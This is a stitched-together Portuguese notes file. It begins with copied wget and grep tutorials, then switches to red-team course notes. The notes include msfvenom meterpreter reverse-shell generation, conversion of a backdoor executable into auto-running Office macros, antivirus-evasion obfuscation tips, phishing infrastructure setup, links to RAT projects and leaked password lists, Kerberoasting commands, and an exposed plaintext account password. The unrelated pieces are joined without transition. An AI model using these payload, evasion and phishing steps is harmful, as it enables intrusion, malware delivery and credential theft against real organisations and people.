Veja como baixar o torrent do Ubuntu via wget:

wget http://releases.ubuntu.com/saucy/ubuntu-13.10-desktop-i386.iso.torrent

Neste exemplos, o wget vai gravar o arquivo baixado no diretório corrente. Fique atento.
wget download torrent ubuntu 13.10
Como baixar um arquivo com wget e salvar com nome diferente ou em diretório diferente

A maneira como wget grava os nomes dos arquivos baixados nem sempre é a mais adequada para a sua situação. Para estes casos, use o parâmetro -O. Veja como:

wget http://releases.ubuntu.com/saucy/ubuntu-13.10-desktop-i386.iso.torrent -O UbuntuSaucySalamander.torrent

O mesmo pode ser feito se você quiser gravar em um diretório diferente do atual:

wget http://releases.ubuntu.com/saucy/ubuntu-13.10-desktop-i386.iso.torrent -O ~/Downloads/UbuntuSaucySalamander.torrent

Como limitar a velocidade de download do wget

Ao executar o aplicativo, ele vai buscar usar toda a banda possível, para terminar logo a tarefa. Em alguns casos, isto pode ser um grande problema – imagine um servidor de produção.
Com o parâmetro --limit-rate, é possível restringir o uso da banda em níveis seguros. Veja como baixar o Ubuntu 14.04 LTS com velocidade limitada a 300k

wget --limit-rate=300k http://releases.ubuntu.com/saucy/ubuntu-13.10-desktop-i386.iso.torrent

wget download ubuntu 14.04
Quando baixar arquivos pequenos, você pode não sentir muita diferença ao fazer neste aspecto, uma vez que o wget não “limita” a banda. Na verdade, ele pausa o processo várias vezes, pelo tempo necessário para que, ao todo, ele fique dentro do limite médio especificado pelo usuário.
Como continuar um download interrompido

Para reiniciar um download no ponto em que ele parou, use a opção -c:

wget -c http://cdimage.ubuntu.com/daily-live/current/trusty-desktop-amd64.iso

Se você não usar esta opção, o wget vai entender que deve criar um novo arquivo – e vai acrescentar “.1” ao final do nome do novo arquivo, para te ajudar a diferenciar os dois.
Faça download em background

É possível deixar o wget rodando “nos bastidores”, enquanto você trabalha no mesmo terminal. Você pode, por exemplo rodar vários wget nos bastidores, usando este método – que é essencialmente útil quando há um grande número de grandes arquivos para ser baixados, mesmo que de sites diferentes. Veja como:

wget -b http://cdimage.ubuntu.com/daily-live/current/trusty-desktop-amd64.iso
Continuando em plano de fundo, pid 28553.
A saída será escrita em “wget-log”.
Solaris-8:~$ 

Como padrão, o wget irá enviar um log desta atividade pro arquivo wget-log. Você pode olhar este log, durante a atividade da seguinte forma:

tail -f wget-log
16950K .......... .......... .......... .......... ..........  1%  458K 45m5s
 17000K .......... .......... .......... .......... ..........  1%  549K 45m1s
 17050K .......... .......... .......... .......... ..........  1%  480K 44m59s
 17100K .......... .......... .......... .......... ..........  1%  442K 44m57s
 17150K .......... .......... .......... .......... ..........  1%  542K 44m53s
 17200K .......... .......... .......... .......... ..........  1%  490K 44m51s
 17250K .......... .......... .......... .......... ..........  1%  505K 44m48s

Se quiser interromper todos os processos do wget em execução, use o seguinte comando:

killall wget

Disfarce de navegador com –user-agent

Alguns sites desabilitam seus downloads quando detectam que não estão sendo feitos por um navegador. Veja como usar o wget “disfarçado” de Firefox:

wget --user-agent="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3) Gecko/2008092416 Firefox/3.0.3" http://cdimage.ubuntu.com/daily-live/current/trusty-desktop-amd64.iso

Neste caso, usei o site do cdimage.ubuntu apenas como exemplo. O site é feito para permitir downloads do wget sem quaisquer disfarces.
Estabeleça um número de tentativas

Conexões problemáticas podem causar interrupções no seu download. Você pode estabelecer um número de tentativas pro wget.

wget --tries=100 http://cdimage.ubuntu.com/daily-live/current/trusty-desktop-amd64.iso

Por padrão, o wget sempre faz 20 tentativas. Portanto, use este parâmetro para especificar número de tentativas diferente deste padrão.
Para especificar um número infinito de tentativas, use tries=0.
Ao obter os seguintes erros, o wget vai parar de tentar imediatamente:

    connection refused – conexão recusada pelo servidor
    file not found (erro 404) – arquivo não encontrado

Como baixar um site completo via wget

Segue o comando para fazer download de um site completo, usando o parâmetro --mirror

wget --mirror -p --convert-links -P ./LOCAL http://www.site.com.br

em que:

    –mirror – liga as outras opções do wget adequadas para fazer o espelhamento do site em questão
    -p – baixa todos os arquivos necessários para que o site inteiro possa ser exibido localmente
    –convert-links – depois de baixar, converte os links em documentos para visualização local
    -P – grava todos os arquivos baixados dentro do diretório especificado

Como fazer o wget rejeitar certos tipos de arquivos

Em alguns casos, não quero baixar as imagens ou os arquivos de vídeo .flv… para estes casos, uso a opção --reject. Veja como (repetindo o exemplo anterior):

wget --reject=flv --mirror -p --convert-links -P ./LOCAL http://www.site.com.br

Como fazer download de apenas certos tipos de arquivos

Temos uma situação contrária à anterior. Ainda usando o mesmo exemplo, vamos restringir os downloads aos arquivos PDF:

wget -r -A.pdf --mirror -p --convert-links -P ./LOCAL http://www.site.com.br

Como baixar arquivos de um servidor FTP com o wget

Se for possível fazer uma conexão anônima, use o wget assim:

wget ftp://meuservidor.com.br

Se o servidor exige que se faça login, use o comando assim:

wget --ftp-user=nomedousuario --ftp-password=senhadele ftp://meuservidor.com.br

Faça bom proveito das dicas e, se quiser, dê uma conferida no comando wput (pra fazer uploads)!

https://elias.praciano.com/2013/12/o-comando-wget-em-10-exemplos/

 Comandos do Wget, só os mais usados, teste o Wget também
Confira a lista dos parâmetros mais usados no Wget, veja os exemplos de comandos!
DicasLinux
Por Emanuel Negromonte Última atualização 20 abr, 2017 0 Comentário
Lista de comandos wget
Want create site? Find Free WordPress Themes and plugins.

Neste post vamos conhecer um pouco mais do poderoso wget, separamos uma lista dos comandos mais usados. O wget já esta na ativa a muitos anos e uma das funções pelo qual ele ainda é muito usado é pelo fato de que ele que recupera arquivos da World Wide Web (WWW) usando protocolos populares como HTTP , HTTPS e FTP. O utilitário Wget é um software livre, e faz parte do projeto GNU. Este utilitário pode ser instalado em qualquer sistema Linux, Windows e MAC OS. É uma ferramenta de linha de comando muita usada, mas para alguns desconhecida. O Wget foi projetado de tal forma que ele funciona em conexões de rede lentas ou instáveis. Wget pode iniciar automaticamente o download onde ele foi parado ou bruscamente interrompido no caso de problema de rede, mas claro, isso é apenas uma parte da lista de comandos do Wget. Ele também baixa o arquivo recursivamente. Ele vai continuar tentando até que o arquivo tenha sido recuperado completamente.
Atenção: Os links de download abaixo são apenas demonstrativos

    Baixar um único arquivo com o Wget

Para estrear a nossa lista de comandos do Wget, claro, a sua principal função, fazer download de arquivos. No comando abaixo ele vai mostrar o progresso do download, data, hora enquanto o arquivo estiver sendo baixado.

Exemplo de uso do comando Wget para baixar arquivos únicos:

wget http://ftp.gnu.org/gnu/wget/wget-1.5.3.tar.gz

 

    Altere o nome do arquivo enquanto o Wget faz o download

Poucos usuários do Wget sabem deste comando, mas ele é muito usado, ele é essencial para você que quer fazer o download de um arquivo e ao mesmo tempo renomear. Usando a opção -O (maiúscula), baixa o arquivo com nome de arquivo diferente. Aqui damos o nome do arquivo sempreupdate.zip:

Exemplo de uso do comando Wget -O para baixar o arquivo com nome diferente:

wget -O sempreupdate.zip http://ftp.gnu.org/gnu/wget/wget-1.5.3.tar.gz

 

    Faça download de vários arquivos via protocolo http ou ftp 

Como este comando do Wget, você pode baixar vários arquivos ao mesmo tempo, ele vai baixar como no exemplo do primeiro comando, ele vai mostrar o progresso, data e hora de cada arquivo.

Exemplo de uso do comando Wget com duas URL’s diferentes e protocolos distintos:

wget http://ftp.gnu.org/gnu/wget/wget-1.5.3.tar.gz ftp://ftp.gnu.org/gnu/wget/wget-1.10.1.tar.gz.sig

 

    Baixar arquivos através de URL’s listadas em arquivo de texto

Com este comando, você pode criar um arquivo txt com todos os links de arquivos que você precisa baixar, e baixá-los com a opção -i . Abaixo criamos tmp.txt no diretório wget onde colocamos vários URLs para download.

Exemplo de uso do comando Wget para baixar arquivos via arquivo txt:
Leia também
Como adicionar o seu usuário a grupos no Linux ou consultar…
25 jul, 2017
Como resolver o problema de conectividade no Ubuntu 17.04
25 jul, 2017
Como Utilizar o Comando Grep
24 jul, 2017

wget -i /wget/tmp.txt

 

    Comando do Wget para continuar o download de onde parou

De forma particular é sem dúvida um dos comandos que mais uso, infelizmente não temos no Brasil conexões estáveis, então para não perder tudo o que já foi baixado eu preferido sempre usar este comando quando vou baixar arquivos via Wget. Para isso, vamos usar o parâmetro -c

Exemplo de uso do comando Wget para continuar arquivos de onde ele parou:

wget -c http://releases.ubuntu.com/17.04/ubuntu-17.04-desktop-i386.iso

 

    Comando do Wget para fazer download em segundo plano

Pois é, este comando do Wget é essencial para quem não quer priorizar o download, e como o nome já diz, deixá-lo em segundo plano. Com a opção -b você pode fazer com que o download seja feito em segundo plano os registros são gravados no arquivo /wget/log.txt.

Exemplo de uso do comando Wget para enviar o download para ser executado em segundo plano:

wget -b /wget/log.txt http://releases.ubuntu.com/17.04/ubuntu-17.04-desktop-amd64.iso

 

    Comando do Wget para restringir limites de velocidade de download

Para você que não tem uma internet não rápida, você pode usar o Wget para impor limites de velocidade. Com o parâmetro Option -limit-rate = 100k , a velocidade de download é limitado a 100k e os logs serão criados em /wget/log.txt.

Exemplo de uso do comando Wget para por limite na velocidade de download:

wget -c --limit-rate=100k /wget/log.txt http://releases.ubuntu.com/17.04/ubuntu-17.04-desktop-amd64.iso

 

    Fazer download via FTP ou HTTP com autenticação

Se você precisa fazer download via FTP ou HTTP com o Wget, então saiba que também é possível. Com Opções -http-user = nome de usuário , -http-password = senha & -FTP-user = nome de usuário , -FTP-password = senha , você pode baixar arquivos protegidos por senha via HTTP ou FTP.

https://sempreupdate.com.br/2017/04/lista-comandos-wget-linux.html


O comando grep

O comando grep pode ser visto como uma forma simplificada de consulta a um banco de dados em texto puro, em que cada linha representa um registro. Pode ser usado para retirar um conjunto de strings (cadeias de caracteres) do resultado de um comando dado ou de um arquivo texto, por mais longo que seja. Os exemplos que vou dar aqui falarão por si.

    LEIA MAIS:

        Conheça estes 7 motivos para usar o comando ack em vez do grep
        Linux — os comandos básicos
        O comando tar em 9 exemplos
        O comando wget em 10 exemplos – veja como fazer downloads mais rápido
        Descubra quem entrou e quando entrou no seu sistema com o comando last

Exemplo básico de uso do comando grep

Para pedir uma lista dos processos em execução na máquina, podemos usar o comando ps aux. Mas a lista pode ser muito extensa e você só quer saber (por exemplo) do que diz respeito ao NetworkManager:

ps aux | grep -i net

Observe que ele exibe e destaca todas as strings contendo a cadeia de caracteres “net”.
Captura de tela de 2013-02-22 13:42:27
O comando ps aux exibe todos os processos em execução. O operador | redireciona os resultados do comando ps pro comando grep, que filtra as ocorrências de “net” do resultado. O parâmetro -i, pede ao comando que ignore se as letras estão em maiúsculas/minúsculas.
Use grep para filtrar resultados de arquivos de log do sistema

Certos arquivos de log do sistema são muito extensos e podem conter uma quantidade imensurável de informações irrelevantes pra sua situação. O comando grep pode ajudar a encontrar “uma agulha no palheiro”.
Vejamos, como exemplo o arquivo de log /var/log/dmesg que contém informações atuais do que está ocorrendo no seu sistema. Vamos visualizar o seu conteúdo – mas vamos deixar de fora tudo o que não se refere à nossa interface de rede eth0:

cat /var/log/dmesg | grep eth0

Captura de tela de 2013-02-22 14:09:19
Como usar o egrep para filtrar resultados com operadores lógicos

Outros comandos, como lshw também retornam uma lista muito extensa e, como é o caso deste, podem demorar muito para finalizar a sua execução. O interessante, aqui, é direcionar o resultado do comando para um arquivo texto, que será usado com muito mais facilidade.
Com o seguinte comando, você cria o arquivo lshw.log contendo o resultado do comando lshw

sudo lshw > lshw.log

Note que o executamos com privilégios administrativos (sudo), conforme recomenda o manual do comando. Mas ele também funciona sem isso.
A seguir vamos usar uma versão diferente do grep, o egrep para filtrar os resultados que se referem às nossas interfaces de rede eth0 e wlan0:

egrep -C 2 -i '(eth|wlan)0' lshw.log

Explicando o comando:

    -C 2 – inclui as 2 linhas acima e as 2 linhas abaixo daquela em que foi encontrada a string desejada. Assim você sabe em que contexto o resultado está inserido.
    -i – desativa a sensibilidade às ‘caixas’, ou seja, tanto faz se os caracteres estiverem em minúsculas ou maiúsculas.
    Operador lógico | – Desde que a string termine com ‘0’, tanto faz que seja ‘eth0’ ou ‘wlan0’. Assim, eu incluo os resultados referentes à interface de rede a cabo e wireless.Captura de tela de 2013-02-22 14:34:04

        LEIA MAIS:
            O comando find — veja como encontrar arquivos no Linux, com exemplos práticos de diversas situações possíveis
            Use o comando grep com dmidecode para obter informações sobre o seu sistema
            Veja como copiar arquivos recursivamente no terminal do Linux
            Aprenda em 10 exemplos a fazer downloads mais rápidos com o comando wget

    Como encontrar arquivos com o comando grep

    Você pode usar o comando grep para encontrar arquivos de texto pelo seu conteúdo.
    Para pesquisar recursivamente no diretório atual por arquivos que contenham a palavra “firefox”, use o comando da seguinte forma:

    grep -iR 'firefox' *.conf

    comando grep para encontrar arquivos por conteúdo
    Conclusão

    Como dicas finais, ao fazer a pesquisa dentro de arquivos grandes, gosto de usar os parâmetros -n e --color. O primeiro numera as linhas, tornando mais fácil, ao abrir o arquivo, encontrar algo que eu desejo alterar. O segundo mostra a saída do comando em cores, o que também ajuda a discernir melhor os resultados.
    Você pode obter mais informações sobre o comando ao executar o seu manual:

    man grep

    De um modo geral, o comando é isto aí.
    Divirta-se!
	
	
https://pen-testing.sans.org/blog/2012/04/26/got-meterpreter-pivot,

http://www3.ifrn.edu.br/~jurandy/fdp/doc/aprenda-python/capitulo_08.html
https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py
https://samsclass.info/lulz/pth-8.1.htm
https://dfir-blog.com/2015/11/08/protecting-windows-networks-defeating-pass-the-hash/
https://adsecurity.org/?p=2362
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
https://cqureacademy.com/blog/identity-theft-protection/pass-hash-attack-tutorial
https://docs.python.org/2/library/ssl.html
https://docs.python.org/3/library/ssl.html
https://forum.fsocietybrasil.org/topic/756-ajuda-python-socket-antivirus-kill-this-resolvido/
https://imasters.com.br/desenvolvimento/comunicacoes-criptografadas-com-websocket-socket-io/?trace=1519021197&source=single
https://pt.stackoverflow.com/questions/6742/socket-ssl-morrendo-no-cliente-e-sem-erros-no-servidor
https://github.com/n1nj4sec/pupy
https://github.com/nathanlopez/Stitch
https://github.com/vesche/basicRAT
https://github.com/M4sc3r4n0/spyrat

Exemplo de uso do comando Wget para fazer download que necessite de autenticação via FTP ou HTTP:

wget --http-user=emanuel --http-password=senha http://releases.ubuntu.com/17.04/ubuntu-17.04-server-i386.iso

wget --ftp-user=sempreupdate --ftp-password=senha ftp.uni-erlangen.de/mirrors/ubuntu-releases/zesty/




-=-=-=-=-=-=-=-=

Curso de Red Team  - H2HC
=========================

SSID novotel - h2hc00

Reconhecimento
--------------

Internet
.	Fontes abertas
.	Google
.	Brute-force DNS
.	Notícias

Físico
.	Local do cliente
.	Perfil do funcionário
.	Local de almoço
.	Tipo de crachá
.	Fornecedores

Utilizar Gesso, Bota ortopédica e Cadeira de rodas abrem portas sem documentos e sem crachás.

Levantar os hosts publicados faciliata muito o teste, pois as vezes descobrimos alvos que não estão protegidos e nem são lembrados.

Google Hacking
 dominio.com -www -descrição ...
www.censys.io <-- parecido ao shodan só que melhor (segundo o balestra).

Bing
	IP:
WHOIS
	descoberta de ranges
DNS
	brute-force
	reverso
	transf zona
		dig axfr @dominio.com
Consulta CNPJ
	https:// registro.br/cgi-bin/whois/#lresp

Construíndo sua crackstation

.	tempo curto para captura de hashs e quebra
.	importante alto poder de processamento
.	exemplo de processamento
	1x GTX 1080 Tipo --> Custo de R$ 3k - cHashCat 
		- MD5		-	38GH/s
		- SHA1		- 	12 GH/s
		- NTLM		- 	60 GH/s
		- Scrypt	- 	800 KH/s
		- WPA 		- 	600 KH/s

		A mascara de hashs
		chashcat ????????
		         ||`->3
				 |`->2
				 `->1
		 1 o primeiro caractere quero que teste todas as possibilidade do ascii (up|low)cases
		 2 o segundo tem que ter um número
		 3 o terceiro alphabetic lowcase
		 ...
		 
		 - Alimentação das placas
			apróximadamente 250-300w por placa de vídeo
		 - Importante fluxo de ar
			- Por que blower?
			- Openair?
		- Placa mãe ASRock H110 BTC+ R$ 1k
		- 2 Fontes de 1600W -> Platinum, Gold (precisa de um adaptador para ligar as duas em paralelo -> AD2PSU)
		- HD para armazenar os hashs
		- Processador básico

Estratégia para crack
.	Wordlist
.	Bruteforce
.	Definição das mascaras

Obs Ambiente AIX suporta no máximo 8 caracteres de senha por padrão. O usuário pode setar uma senha de 20 char porém o AIX só considera os 8 primeiros chars.

Um exemplo a senha do AIX tinha 14 char no brute force foi quebrado os 8 primeiros chars e percebeu-se que não logava em outros ambientes com o mesmo usuário do AIX. Isso porque ele tinha outros 6 chars não quebrado, ao conseguir um hash de um linux foi setado para o hashcat o 8 chars fixos e pediu para variar apenas os outros 6.

199*(5?) - 200(2-4?)

Vulnerability Assessment (VA) - Nessus, NMap, OpenVaz, ...
- Objetivo é uma lista de vuln
- 

Penetration Test
- Simulação de um ataque real com objetivos reais.
- Explorar as vuln
- Não se preocupla com todas as vulnerabilidade apenas precisa de uma para comprometer o alvo
- Para quando o objetivo é alcançado

- Comprometer
	- workstations reporter/direfctor
	- database payship
	- PCI DSS network system

Mais Reail
- Um teste direcionado que tenta explorar o máximo de alvo durante o tempo estipulado
- Tenta explorar alvos dentro do escopo

Penteste 
	- OpenSSH banner/version based vuln? Não
	- SSL Issues? Sim mesmo que não explorado.
	- Padding Oracle? Sim
	- RDP Issue? Sim
	- MS1-010? Sim 
		Exploit public para Win7 win2008 R2? Sim e explora.
		Não tem exploit publico Win8/8.1, Win12 R2 e Win2016? Sim Mesmo que não tem exploit public.
		
PPKI - Private Public Key

	- Rede Interno/Externo
	- Wireless
	- Web Application
	- Mobile Application
	- VDI (Virtual Desktop Infrastructure - Citrix, RDPm etc)
	- Phishing e Eng Social
	- Outros (Físico, ATM, Maq de cartão de credito)

	PenTest Rede
	Input:
		IP Address Range.
	Output:
		A lista de vuln e remediações e a ordem dos riscos (mesmo que não explorável).


	PenTest Web
	Input:
		- URLs
		- Two users of each role
		- Other (Tokens, certificates, etc)
	Output:
		- A lista de vuln e remediações e a ordem dos riscos (mesmo que não explorável).
		- Boas práticas de programação.

	  VDI
	  Input:
		- IP
		- Credential
	  Output:
		- Application scope
		- Arbitrary execution code (cmd, powershell, ftp, wmic, vbs, vba paint brush)
		- privilege escalation (weak, fs permissions, specific application vectors, local kernel vuln, files stroring passwords, etc)
	
	Phising Eng Social
	Input:
		- Domain name
		- Adicional e-mail adrress (depends an the methodology employed)
		- Physical targetd location address (optional)
	Output:
		- Who opened the link
		- Who provided credentials
		- Who executed the payloads
		
		Fazer os testes do VRFY e o RCPT TO do SMTP.
  
Read Team

Apareceu nos ultimos anos.

- Metodologia que tenta atacar alvos reais
- Para achar senhas vazadas
- Uso de proxys
- Deve ser o mais furtivo (não pode ser descobertos, tem que ser invisível)
- O teste é ilimitado e o time de TI/Diretor não sabe
- Não faz DoS ou algo que possa causar danos a empresa.

Pesquise por Raian Jones - fez o seriado Target Team

Em caso de teste web o sistema está lento, o certo é reportar o mais rápido possível, uma boa abordagem é que em um brute-force você poderia informar que o sistema está lento informar que você poderia ser mais efetivo se tivesse mais tempo. Outra seria, se uma informação que eu obteria em mais dias que os cedidos ao pentest seria ligar para o cliente e informa-lo que você obteria a informação se houvesse mais tempo e se ele gostaria de entregar a informação para seguir daquele ponto.

Ameaças do mundo real
-	Cyber Criminal ($$)
-	Corporate Espionage (Infornmation)
-	Hacktivism (Reputation Damage)
-	State-Sponsored Attackers (Spy, Sabotage, etc)

Reaf Tesam Steps
- Reconnaissance
- OSINT
	- Drones
	- On site covert observation
	- Test Plan.
- Execultion (Exploitation/Post-Exploitation)
- Reparting

Input:
	- Company Name
	- Physical Location
Output:	
	- Test Methodology
	- Attack line
	- Findings and recommendations
	- Risk methodology

projeto unicornio - Scanner
projeto smash

Obs: curso melhor que da offensive security - elearn securoty - EWPT
											  CRT
GoPhishiing

Phishing
Crie uma conta na amazon ec2

Registro de um domínio próprio
Registro




https://us-east-2.console.aws.amazon.com/
whenrique@pridesec.com.br

Bndjb@Rdwn2!

sendgrid


A		@		182.0.0.1					600ms
CNAME	smtp	sendgrid.net 				1h
MX		@		sendgrid.net (prioridade0)	1h
NS		@		ns29.domaincontrol.com		1h
NS		@		ns30.domaincontrol.com		1h
A		vpn		182.0.0.1					1h
A		admin	182.0.0.1					1h
TXT		smtpapi._do		k=rsa;t=s;p=MIG1MA0GC
TXT		smtpapi._do

@ com valor v=spf1 a mx include:sendgrid.net ~all

smtpapi._domainkey com valor k=rsa; t=s; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDPtW5iwpXVPiH5FzJ7Nrl8USzuY9zqqzjE0D1r04xDN6qwziDnmgcFNNfMewVKN2D1O+2J9N14hRprzByFwfQW76yojh54Xu3uSbQ3JP0A7k8o8GutRF8zbFUA8n0ZH2y0cIEjMliXY4W4LwPA7m4q0ObmvSjhd63O9d8z1XkUBwIDAQAB
 
smtpapi._domainkey.smtp com valor k=rsa; t=s; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDPtW5iwpXVPiH5FzJ7Nrl8USzuY9zqqzjE0D1r04xDN6qwziDnmgcFNNfMewVKN2D1O+2J9N14hRprzByFwfQW76yojh54Xu3uSbQ3JP0A7k8o8GutRF8zbFUA8n0ZH2y0cIEjMliXY4W4LwPA7m4q0ObmvSjhd63O9d8z1XkUBwIDAQAB

https://paste.ee/r/yAAUq/0

Godere - pessa para gerar um dominio com o nome do alvo

Pesquisa no google gophish docker para pegar o link
https://hub.docker.com/r/matteoggl/gophish

-=-=-=-=-=-=-

Usage
Quickstart
docker run -ti --name gophish -p 3333:3333 -p 8083:80 matteoggl/gophish
To run as a daemon:

docker run -d --name gophish -p 3333:3333 -p 8083:80 matteoggl/gophish
In your browser, go to http://your-docker-machine-ip:3333

Building the image
git clone https://github.com/matteoggl/docker-gophish
cd docker-gophish
docker build -t "yourname/gophish:yourtag" .
Different gophish version
You can run a different version of gophish by simply applying the corresponding tag.

e.g. matteoggl/gophish:gophish0.1.1

-=-=-=-=-=-=-=-


sudo 
apt-update
apt-get docker.io

git clone https://github.com/matteoggl/docker-gophish
cd docker-gophish
docker build -t "yourname/gophish:yourtag" .
docker run -ti --name gophish -p 3333:3333 -p 8083:80 matteoggl/gophish

sobe na cli podemos subir como daemon
docker run -d --name gophish -p 3333:3333 -p 8083:80 matteoggl/gophish

vai na web e acessa

senha default
admin:gophish

**2 papel

PenTest: Evolution and Tricks
-----------------------------

Trick #2 - Phishing
Email phishing
	1 - Register a new domain with similar name
	2 - Use big player that send marketing compaign (sendgrid, XXXX)
	3 - Use let's encrypt
	4 - Configure properly the DNS (Reverse, SPF, DNS Sec, etc)

	Payloads for client side in phishing 
		- PDF with JS
		- Office documents with:
			Macros
			OLE Object
		- Executing
			Precisa mascarar, como zipar, e orientar o usuário a descompactar e executar o arquivo arq.doc.exe|ard.pdf.executa
		- Caso o usuário tente abrir online (conmo no google docs), você pode criar uma mascara dizendo que o documento não pode ser aberto online, e quando baixado e aberto ele abre o conteúdo.

Informações OpenSource

leaks de senhas
Base de leaks públicos
https://publicdbhost.dmca.gripe/

Listas pagas
https://raidforums.com/Thread-Exploit-in-Combo-List-Leaked-Download

Consulta de vazamento
https://haveibeenpwned.com

Criar sistema de monitoramento próprio

https://github.com/xme/pastemon

- Verifique a lista dos últimos pasties
Verifique se você jáacessou
Se ainda não acessou, acesse e aplicaque as redes
Se acessou, descarte e passe para o próximo
Se alguma regra dar match, salve o paste para futura análise
	Opcional: gerar alertas em caso de match

DMA - Direct Memory Access
--------------------------

PCI, PCI-e, Firewire, PCMCIA, Thunderbold

bypass de dispositivos de segurança, pois eles agem no momento em que o processo sobe, neste caso você injeta direto na memória.
Pode ser utilizado para dumpar a mamória.

https://github.com/ufrisk/pcileech

tool chamada inseption para injetar dados direto na memória

arduino-1.8 para programar o chip que foi dado no evento.



spiderlabs james bound
		
Exploit
=======
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.135.130 LPORT=4444 EXITFUNC=thread -f c

 vi x.txt
   72  cat x.txt | sed 's/\\/,0/g' | tr -d '\"\n'
   73  vi Invoke-Shellcode.ps1
   74  ./gen_vbs.py --inputFile ./Invoke-Shellcode.ps1 --writeFilePath="%TEMP%\\invoke_cb.ps1" --cmd="%SYSTEMROOT%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -executionpolicy bypass %TEMP%\\invoke_cb.ps1"
   75  ifconfig
   76  netstat -napt
   77  cat x.txt | sed 's/\\/,0/g' | tr -d '\"\n' | sed 's/^,/Invoke-Shellcode -Force -Shellcode @(/g' | sed 's/$/)\n/g'




Public Sub AutoExec()
vzvjsdhzoh
isqoabhwlh
End Sub

Public Sub Auto_Exec()
vzvjsdhzoh
isqoabhwlh
End Sub
Public Sub AutoOpen()
vzvjsdhzoh
isqoabhwlh
End Sub
Public Sub Auto_Open()
vzvjsdhzoh
isqoabhwlh
End Sub
Public Sub Document_Open()
vzvjsdhzoh
isqoabhwlh
End Sub
Public Sub Workbook_Open()
vzvjsdhzoh
isqoabhwlh
End Sub



  78  vi exe2vbs.c
   79  ls
   80  gcc -o exe2vba exe2vba.c
   81  ls
   82  msfvenom -a x86 --platform -p windows/meterpreter/reverse_tcp LHOST=192.168.224.139 LPORT=1337 -f exe -o backdoor.exe
   83  ./exe2vba backdoor.exe | xclip -i
   84  xclip --help
   85  ./exe2vba backdoor.exe
   86  history

   root@h2hc-pwner:~# ./exe2vba backdoor.exe > bd.vbs
root@h2hc-pwner:~# vi bd.vbs
oot@h2hc-pwner:~# vi bd.vbs
root@h2hc-pwner:~# > bd.vbs
root@h2hc-pwner:~# vi bd.vbs
root@h2hc-pwner:~# vi bd.vbs
root@h2hc-pwner:~# mv bd.vbs bd.txt
root@h2hc-pwner:~# cp bd.txt /var/www/html/


submeter no nodistribute -> https://nodistribute.com/

Windows

vbs

Chr(Abs(-86)+1) & Chr(54) -> 87 54
strPA = pdni
StrReverse(Mid(strPA, 2, 3) -> StrReverse(Mid(dni)) -> ind

Path = "W" & StrReverse & "ows" -> Windows

outra forma seria ler as variáveis de ambiente e ir montando a palavra que você gostaria utilizando Mid, Chr, etc


Para testar onde está a identificação da assinatura, basta cortar seu código em três partes e submeter as 3 partes e ver onde está sendo identificado.

vbger tools

payload com rc4 onde você seta senha.
no venom use -e para fazer o shagata-ganay

pode usar xor, etc...

cobaltstrik exfiltration

lilowendo

chipvps - vps que não derruba sua tools hacker

canal 
crypto storm


./Responder -I eth0 -wrf -i IP

https://github.com/urbanesec/ZackAttack

IMPACET-MASTER/EXEMPLES\GetUserSPN.py -request h2hc.com\dmr:December21 -dc-ip IP-do_AD
Vai extrair os SPN

Você pode quebrar con o john the ripper



wmicexe.py





